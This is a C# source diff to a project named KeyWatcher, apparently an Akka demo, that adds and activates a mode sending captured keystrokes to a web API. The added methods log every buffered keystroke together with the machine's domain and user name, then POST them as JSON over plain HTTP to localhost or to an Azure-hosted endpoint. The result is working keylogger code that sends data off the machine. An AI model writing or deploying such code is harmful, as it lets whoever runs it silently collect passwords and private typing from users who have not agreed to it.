@@ -6,8 +6,11 @@ using Autofac;
 using KeyWatcher.Actors;
 using KeyWatcher.Dependencies;
 using KeyWatcher.Messages;
+using Newtonsoft.Json;
 using System;
+using System.Net.Http;
 using System.Reactive.Linq;
+using System.Text;
 using System.Windows.Forms;
 
 namespace KeyWatcher.Host
@@ -22,7 +25,9 @@ namespace KeyWatcher.Host
 			//Program.UseBufferedKeyWatcher();
 			//Program.UseAkkaLocally();
 			//Program.UseAkkaWithRemoting();
-			Program.UseAkkaWithRemotingWithQuietness();
+			//Program.UseAkkaWithRemotingWithQuietness();
+			//Program.UseAkkaViaWebApiLocally();
+			Program.UseAkkaViaWebApiOnAzure();
 		}
 
 		private static void UseBufferedKeyWatcher()
@@ -146,6 +151,50 @@ akka {
 					}
 				}
 			}
+		}
+
+		private static void UseAkkaViaWebApiLocally()
+		{
+			var userName = Program.GetUserName();
+
+			using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
+			{
+				keyLogger.KeysLogged += (s, e) =>
+				{
+					var message = JsonConvert.SerializeObject(
+						new UserKeysMessage(userName, e.Keys), Formatting.Indented);
+					var content = new StringContent(message,
+						Encoding.Unicode, "application/json");
+					var postResponse = new HttpClient().PostAsync("http://localhost:6344/api/keywatcher", content);
+					postResponse.Wait();
+				};
+
+				Application.Run();
+			}
+
+			Console.ReadLine();
+		}
+
+		private static void UseAkkaViaWebApiOnAzure()
+		{
+			var userName = Program.GetUserName();
+
+			using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
+			{
+				keyLogger.KeysLogged += (s, e) =>
+				{
+					var message = JsonConvert.SerializeObject(
+						new UserKeysMessage(userName, e.Keys), Formatting.Indented);
+					var content = new StringContent(message,
+						Encoding.Unicode, "application/json");
+					var postResponse = new HttpClient().PostAsync("http://keywatcherazurejr.azurewebsites.net/api/keywatcher", content);
+					postResponse.Wait();
+				};
+
+				Application.Run();
+			}
+
+			Console.ReadLine();
 		}
 
 		private static string GetUserName() => $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName + "-" : string.Empty)}{Environment.UserName}";
